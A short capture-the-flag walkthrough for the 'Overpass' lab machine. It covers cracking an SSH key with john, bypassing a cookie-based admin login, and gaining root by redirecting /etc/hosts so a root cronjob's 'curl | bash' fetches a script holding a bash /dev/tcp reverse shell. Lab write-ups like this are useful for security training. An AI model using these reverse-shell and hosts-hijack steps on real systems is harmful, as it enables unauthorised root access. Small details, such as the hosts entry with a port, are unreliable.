# Overpass

> What happens when some broke CompSci students make a password manager?

<br>

Process:
- 1) run Autorecon
  - found:
    - 22
    - 80
- 2) enumerate port 80
  - found "/admin" directory 
  - login is based on cookies and client-side JS
  - bypass this with burpsuite 
  - found encrtyped SSH key 
- 3) decrypt SSH key:
  - `ssh2john id_rsa > hash.txt`
  - `john --wordlist=<wordlist> hash.txt`
  - password = "james13"
- 4) ssh into system
  - `ssh james@<ip>` -> [james13]`
  - `cat user.txt` = **...**
- 5) escalate privileges
  - `cat todo.txt` -- stored password in overpass password manager:
    - `overpass` -> [4] to retrieve all passwords 
    - password = "System" 
    - password = "saydrawnlyingpicture"
  - found cronjob that runs as root:
    - "* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash"
  - can inject code to get a root shell 
  - "overpass.thm" in /etc/hosts fils points to localhost (127.0.0.1), can change this to point at my IP
    - in /etc/hosts -> "10.11.31.198:4444 overpass.thm"
  - create reverse shell on own system:
    - `mkdir -p downloads/src && touch downloads/src/buildscript.sh`
    - `echo 'bash -i >& /dev/tcp/10.11.31.198/1234 0>&1' > downloads/src/buildscript.sh`
    - `chmod +x /downloads/src/buildscript.sh`
  - create python http-server listening for connection:
    - `sudo python3 -m http.server 80`
  - setup second netcat listener to catch reverse shell:
    - `nc -lvnp 1234`
- 6) once caught you'll have a root reverse shell
  - `cat root.txt` = **...**
